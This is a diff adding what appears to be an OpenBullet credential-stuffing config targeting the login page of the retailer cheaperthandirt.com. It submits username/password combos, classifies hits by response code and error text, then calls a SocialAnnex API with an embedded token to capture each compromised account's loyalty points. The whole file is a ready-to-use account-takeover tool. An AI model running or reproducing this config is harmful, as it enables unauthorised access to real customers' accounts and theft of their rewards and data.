@@ -1,0 +1,58 @@
+[SETTINGS]
+{
+  "Name": "CheaperThanDirt",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2019-06-08T21:30:17.2274247-04:00",
+  "AdditionalInfo": "",
+  "Author": "LethalLuck",
+  "Version": "1.2.8 Anomaly",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://www.cheaperthandirt.com/checkout/literegistration.do?method=submitLogin" 
+  CONTENT "socialLoginLinkAccountsRequired=false&socialLoginFromPage=LITEREGISTRATION&mergeAccount=&loginEmail=<USER>&loginPassword2=<PASS>&ContinueAccountSetupForm=Login" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Host: www.cheaperthandirt.com" 
+
+KEYCHECK 
+  KEYCHAIN Success AND 
+    KEY "<RESPONSECODE>" Contains "200" 
+    KEY "{}" 
+  KEYCHAIN Failure AND 
+    KEY "<RESPONSECODE>" Contains "400" 
+    KEY "{}" 
+  KEYCHAIN Failure OR 
+    KEY "Please use the format name@domain.xxx" 
+
+REQUEST GET "https://s15.socialannex.com/v2_api/get_apiv2_user.php?email=<USER>&siteid=9411111&token=59ToJtxPB68NsV0neDFT" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" JSON "available_points" -> CAP "Points" 
+
